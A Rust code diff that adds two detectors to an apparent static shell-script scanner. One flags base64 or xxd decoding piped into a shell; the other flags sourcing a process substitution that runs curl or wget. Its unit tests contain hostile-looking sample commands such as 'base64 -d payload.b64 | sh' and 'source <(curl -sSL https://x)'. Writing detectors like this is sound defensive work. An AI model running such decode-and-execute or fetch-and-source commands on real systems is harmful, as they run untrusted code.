@@ -150,6 +150,120 @@ pub(crate) fn curl_pipe_shell(source: &str) -> Option<usize> {
     None
 }
 
+/// Does `cmd` resolve, possibly through an `env`/`env -S` wrapper, to one
+/// of `SHELL_NAMES`? The "is the last stage of this pipeline a shell"
+/// half of `curl_pipe_shell`, factored out so `decode_pipe_shell` below
+/// can reuse it instead of duplicating the env-unwrap/quoting/
+/// concatenation handling.
+fn command_is_shell(cmd: Node, src: &[u8]) -> bool {
+    let Some(name) = command_name_of(cmd, src) else { return false };
+    let effective = if name == "env" {
+        let mut c3 = cmd.walk();
+        let arg_words: Vec<Node> = cmd.children(&mut c3).filter(|c| c.kind() == "word").collect();
+        arg_words.into_iter().filter_map(|w| resolve_word(w, src)).find(|w| !w.starts_with('-'))
+    } else {
+        Some(name)
+    };
+    effective.is_some_and(|eff| SHELL_NAMES.contains(&basename(&eff)))
+}
+
+/// Command names that decode/obfuscate an inline payload rather than fetch
+/// one over the network -- the base64/hex analog of `FETCHERS`, checked by
+/// `decode_pipe_shell`.
+const DECODERS: &[&str] = &["base64", "xxd"];
+
+/// All of `cmd`'s arguments (everything but the command name itself),
+/// statically resolved to strings -- an argument built from something
+/// dynamic is just dropped rather than bailing the whole command, since a
+/// flag check only needs to see the *literal* flags to reach a confident
+/// "yes" and dropping one unresolved argument can't turn a real "yes" into
+/// a false "no".
+fn command_arg_words(cmd: Node, src: &[u8]) -> Vec<String> {
+    let mut cursor = cmd.walk();
+    cmd.children(&mut cursor)
+        .filter(|c| c.kind() != "command_name")
+        .filter_map(|c| resolve_word(c, src))
+        .collect()
+}
+
+/// Structural equivalent of `base64_pipe_shell_line`/`xxd_pipe_shell_line`:
+/// a `pipeline` node where an earlier command is `base64` with a
+/// `-d`/`--decode` flag, or `xxd` with both a `-r` and a `-p` flag
+/// (combined or separate, either order), and the last command resolves to
+/// a shell -- same env-wrapper/quoting/concatenation handling as
+/// `curl_pipe_shell`, via `command_is_shell`. Same obfuscation role as
+/// curl|sh, just decoding an inline-stashed blob instead of fetching one.
+pub(crate) fn decode_pipe_shell(source: &str) -> Option<usize> {
+    let tree = parse(source)?;
+    let src = source.as_bytes();
+    let mut pipelines = Vec::new();
+    find_descendants(tree.root_node(), "pipeline", &mut pipelines);
+    for pipeline in pipelines {
+        let mut cursor = pipeline.walk();
+        let commands: Vec<Node> = pipeline.children(&mut cursor).filter(|c| c.kind() == "command").collect();
+        if commands.len() < 2 {
+            continue;
+        }
+        let has_decoder = commands[..commands.len() - 1].iter().any(|c| {
+            let Some(name) = command_name_of(*c, src) else { return false };
+            if !DECODERS.contains(&name.as_str()) {
+                return false;
+            }
+            let flags: Vec<String> = command_arg_words(*c, src).iter().map(|a| a.to_lowercase()).collect();
+            let is_short_flag_containing = |f: &str, ch: char| {
+                f.starts_with('-') && !f.starts_with("--") && f.contains(ch)
+            };
+            match name.as_str() {
+                "base64" => flags.iter().any(|f| f == "-d" || f == "--decode" || is_short_flag_containing(f, 'd')),
+                "xxd" => {
+                    let has_r = flags.iter().any(|f| is_short_flag_containing(f, 'r'));
+                    let has_p = flags.iter().any(|f| is_short_flag_containing(f, 'p'));
+                    has_r && has_p
+                }
+                _ => false,
+            }
+        });
+        if !has_decoder {
+            continue;
+        }
+        let last = commands[commands.len() - 1];
+        if command_is_shell(last, src) {
+            return Some(line_of(pipeline));
+        }
+    }
+    None
+}
+
+/// Structural equivalent of `source_process_subst_line`: a `source` (or
+/// `.`) command whose argument is a `process_substitution` (`<(...)`)
+/// containing a curl/wget command anywhere inside it -- the process-
+/// substitution cousin of `eval_remote_exec` (command substitution,
+/// `$(...)`) and `curl_pipe_shell` (a literal pipe): the fetched script is
+/// read straight out of the substitution by `source`/`.`, with neither a
+/// pipe nor a `$(...)` for those other two checks to key on.
+pub(crate) fn source_process_subst_remote(source: &str) -> Option<usize> {
+    let tree = parse(source)?;
+    let src = source.as_bytes();
+    let mut commands = Vec::new();
+    find_descendants(tree.root_node(), "command", &mut commands);
+    for cmd in &commands {
+        let Some(name) = command_name_of(*cmd, src) else { continue };
+        if name != "source" && name != "." {
+            continue;
+        }
+        let mut substs = Vec::new();
+        find_descendants(*cmd, "process_substitution", &mut substs);
+        for subst in substs {
+            let mut inner = Vec::new();
+            find_descendants(subst, "command", &mut inner);
+            if inner.iter().any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str()))) {
+                return Some(line_of(*cmd));
+            }
+        }
+    }
+    None
+}
+
 /// Structural equivalent of `eval_remote_exec_line`: an `eval` command
 /// whose arguments contain a `command_substitution` that itself contains
 /// a curl/wget command anywhere inside it, however it's nested (piped,
@@ -345,6 +459,34 @@ mod ast_tests {
         assert_eq!(sudo_escalation("makedepends=('sudo')"), None);
         assert_eq!(sudo_escalation("depends=('sudo' 'other')"), None);
         assert_eq!(sudo_escalation("# sudo ./validator"), None);
+    }
+
+    #[test]
+    fn decode_pipe_shell_base64_and_xxd_caught() {
+        assert_eq!(decode_pipe_shell("base64 -d payload.b64 | sh"), Some(1));
+        assert_eq!(decode_pipe_shell("base64 --decode payload.b64 | /bin/bash"), Some(1));
+        assert_eq!(decode_pipe_shell("echo \"$blob\" | base64 -d | env bash"), Some(1));
+        assert_eq!(decode_pipe_shell("xxd -r -p payload.hex | bash"), Some(1));
+        assert_eq!(decode_pipe_shell("xxd -rp payload.hex | sh"), Some(1));
+        // decoding but writing to a file, not a shell: must not flag
+        assert_eq!(decode_pipe_shell("base64 -d payload.b64 -o payload.bin"), None);
+        assert_eq!(decode_pipe_shell("base64 -d payload.b64 | tee out.bin"), None);
+        // xxd without -p (default hex-dump-with-offsets format, not the
+        // plain-hex encoding an attacker would actually stash a payload
+        // in) shouldn't flag on -r alone
+        assert_eq!(decode_pipe_shell("xxd -r dump.hex | sh"), None);
+        assert_eq!(decode_pipe_shell("# base64 -d payload.b64 | sh"), None);
+    }
+
+    #[test]
+    fn source_process_subst_remote_caught_and_not_false_positive() {
+        assert_eq!(source_process_subst_remote("source <(curl -sSL https://x)"), Some(1));
+        assert_eq!(source_process_subst_remote(". <(wget -qO- https://x)"), Some(1));
+        // a process substitution not fed to source/. shouldn't flag
+        assert_eq!(source_process_subst_remote("diff <(curl -sSL https://x) file.txt"), None);
+        // source-ing a local file shouldn't flag
+        assert_eq!(source_process_subst_remote("source ./helpers.sh"), None);
+        assert_eq!(source_process_subst_remote("# source <(curl https://x)"), None);
     }
 
     #[test]
